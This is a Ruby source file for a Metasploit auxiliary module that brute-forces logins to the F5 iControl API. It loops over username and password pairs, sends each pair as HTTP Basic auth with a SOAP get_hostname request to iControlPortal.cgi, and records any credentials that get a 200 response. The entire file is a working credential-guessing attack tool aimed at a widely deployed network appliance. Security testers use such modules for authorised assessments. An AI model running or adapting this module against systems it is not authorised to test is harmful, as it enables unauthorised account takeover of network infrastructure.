##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'F5 iControl Login Bruteforcer',
      'Description' => 'This module attempts to bruteforce F5 iControl API logins.',
      'Author'      => [ 'bperry' ],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('TARGETURI', [true, 'Base URI of the F5', '/'])
      ], self.class)
  end

  def run_host(ip)

    res = send_request_cgi({
      'method'  => 'GET',
      'uri'	 => '/'
    })

    unless res
      vprint_error("#{ip} seems to be down")
      return
    end

    each_user_pass { |user, pass|
      try_login(user,pass)
    }
  end

  def try_login(user, pass)

    get_hostname_soap = %q{<?xml version="1.0" encoding="ISO-8859-1"?>
      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
      <SOAP-ENV:Body>
        <n1:get_hostname xmlns:n1="urn:iControl:System/Inet"/>
        </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>
    }

    basic_auth = Rex::Text.encode_base64(user+':'+pass)

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'iControl', 'iControlPortal.cgi'),
      'method' => 'POST',
      'headers' => {
        'Authorization' => 'Basic ' + basic_auth.dup
      },
      'data' => get_hostname_soap
    })

    if res and res.code == 200
      print_good("Successful login '#{user}' password: '#{pass}'")
      report_auth_info({
        :host   => rhost,
        :proto => 'https',
        :sname  => 'icontrol',
        :user   => user,
        :pass   => pass,
        :target_host => rhost,
        :target_port => rport
      })
      return :next_user
    else
      vprint_error("Failed to login as '#{user}' password: '#{pass}'")
      return
    end
  end
end
